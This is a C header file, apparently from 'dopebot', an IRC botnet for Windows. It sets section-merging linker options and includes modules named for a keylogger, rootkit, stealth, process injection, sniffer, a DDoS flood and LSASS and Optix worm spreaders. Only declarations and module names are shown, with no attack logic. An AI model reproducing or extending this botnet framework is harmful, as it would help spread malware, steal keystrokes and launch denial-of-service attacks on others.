/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

//Optimization Code
#pragma optimize("gsy", on)
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/ENTRY:entry_point")
#pragma comment(linker, "/MERGE:.rdata=.data") 
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data") 
#pragma comment(linker, "/SECTION:.text,EWR /IGNORE:4078")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/stub:stub.dat")
#pragma comment(linker, "/base:0x13140000")
//#pragma comment(linker, "/subsystem:console") //Comment Out For Release || NOTE: _NOT_RELEVANT_ANYMORE_DONT_TOUCH!!
#pragma pack(1)

//Libs
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "shell32")
#pragma comment(lib, "msvcrt")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "wininet")
#pragma comment(lib, "ws2_32")

//Regular Includes
//#define _WIN32_WINNT 0x0403 //Important For Critical Sections
//#define _WIN32_WINNT 0x0500 //Some Functions Need This...
#define  WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "EliRT.h"
#include <shellapi.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <winsock2.h>

//Project Includes
#include "crypto.h"
#include "download.h"
#include "file.h"
#include "fwb.h"
#include "injection.h"
#include "install.h"
#include "keylogger.h"
#include "melt.h"
#include "misc.h"
#include "netinfo.h"
#include "process.h"
#include "registry.h"
#include "rootkit.h"
#include "service.h"
#include "scanner.h"
#include "secure.h"
#include "sfc.h"
#include "sniffer.h"
#include "stealth.h"
#include "sysinfo.h"
#include "tcpip.h"
#include "transfer.h"
#include "unhook.h"
#include "Protocol\irc.h"
#include "..\Daemons\ftpd.h"
#include "..\Daemons\identd.h"
#include "..\Daemons\tftpd.h"
#include "..\DDOS\bandwithflood.h"
#include "..\Settings\defines.h"
#include "..\Settings\externs.h"
#include "..\Spreaders\lsasspreader.h"
#include "..\Spreaders\optixspreader.h"

//Functions
void entry_point();
DWORD WINAPI irc_main(LPVOID param);
void irc_parse(SOCKET bsock, WSAEVENT event, char *szBuffer);
